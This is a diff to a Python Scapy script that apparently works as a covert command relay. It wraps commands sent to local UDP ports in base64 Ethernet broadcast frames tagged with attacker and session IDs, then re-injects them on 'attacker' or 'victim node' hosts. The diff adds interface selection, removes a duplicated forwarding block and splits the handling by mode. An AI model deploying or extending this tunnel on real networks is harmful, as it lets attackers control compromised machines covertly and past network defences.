@@ -39,7 +39,7 @@ def Delimiter(payload):
     return msg
 
 # Function to run the sniffing process
-def start_sniffing(attacker_id, session_id, mode):
+def start_sniffing(attacker_id, session_id, mode, interfaces):
     def packet_handler(packet):
         #print("Packet captured:", packet.summary())
 
@@ -76,35 +76,7 @@ def start_sniffing(attacker_id, session_id, mode):
                 if mode == "connect": # If the attacker_id and session_id are both sent, it is for a node
                     frame_payload = str(attackerId + sessionId + delim1 + base64_string_payload + delim2).encode("utf-8")
                     eth_frame = Ether(dst="FF:FF:FF:FF:FF:FF") / frame_payload
-                    sendp(eth_frame, verbose=False)
-                    
-            if src_port == 2223 and dst_port == 1111: # This condition is a cmd being sent
-                print("aaa")
-                packet[UDP].dport = 1111
-                udp_payload = bytes(packet[UDP].payload)
-                udp_payload = udp_payload.decode("utf-8")
-                packet[IP].chksum = None
-                packet[UDP].chksum = None
-                packet = IP(src="127.0.0.1", dst="127.0.0.1") / UDP(sport=2222, dport=1111) / udp_payload # This structure will need to be sent
-                
-                # Now, the frame needs to be constructed - For now this will be broadcasts
-                delim1 = "!PayloadStart!"
-                delim2 = "!PayloadStop!"
-                attackerId = attacker_id  #Changethis
-                sessionId  = session_id #Changethis
-                payload = str(udp_payload).encode("utf-8")
-                base64_payload = base64.b64encode(payload) # Bytes
-                base64_string_payload = base64_payload.decode("utf-8") # String
-                
-                if mode == "listen": # The attacker id is omitted
-                    frame_payload = str(sessionId + delim1 + base64_string_payload + delim2).encode("utf-8")
-                    eth_frame = Ether(dst="FF:FF:FF:FF:FF:FF") / frame_payload
-                    sendp(eth_frame, verbose=False)
-                
-                if mode == "connect": # If the attacker_id and session_id are both sent, it is for a node
-                    frame_payload = str(attackerId + sessionId + delim1 + base64_string_payload + delim2).encode("utf-8")
-                    eth_frame = Ether(dst="FF:FF:FF:FF:FF:FF") / frame_payload
-                    sendp(eth_frame, verbose=False)
+                    sendp(eth_frame, verbose=False)  
         
         # if Ethernet frame - not implemented, checking for server response
         if Ether in packet:
@@ -121,7 +93,7 @@ def start_sniffing(attacker_id, session_id, mode):
                 print("sess: " + str(index))
                 print("att: " + str(attacker_index))
                 #print("pay: " + str(eth_frame.payload.original.decode("utf-8")))
-                if index != -1 and attacker_index == -1: # This is for the attacker
+                if index != -1 and attacker_index == -1 and mode == "connect": # This is for the attacker
                     print("Source MAC:", eth_frame.src)
                     print("Destination MAC:", eth_frame.dst)
                     print("Payload Length:", len(eth_frame.payload))
@@ -137,7 +109,7 @@ def start_sniffing(attacker_id, session_id, mode):
                     packet[UDP].chksum = None
                     send(packet)
                 
-                if index != -1 and attacker_index != -1: # This is for the victim node
+                if index != -1 and attacker_index != -1 and mode == "listen": # This is for the victim node
                     print("Source MAC:", eth_frame.src)
                     print("Destination MAC:", eth_frame.dst)
                     print("Payload Length:", len(eth_frame.payload))
@@ -160,8 +132,9 @@ def start_sniffing(attacker_id, session_id, mode):
         sniff(prn=packet_handler, iface=interfaces)
         
 # Start sniffing in a separate thread
-def start_sniffing_args(attacker_id, session_id, mode):
-    sniffing_thread = threading.Thread(target=start_sniffing, args=(attacker_id, session_id, mode))
+def start_sniffing_args(attacker_id, session_id, mode, interfaces):
+    inter = ["\\Device\\NPF_Loopback",interfaces] 
+    sniffing_thread = threading.Thread(target=start_sniffing, args=(attacker_id, session_id, mode, inter))
     sniffing_thread.start()
 
     while sniffing_running:
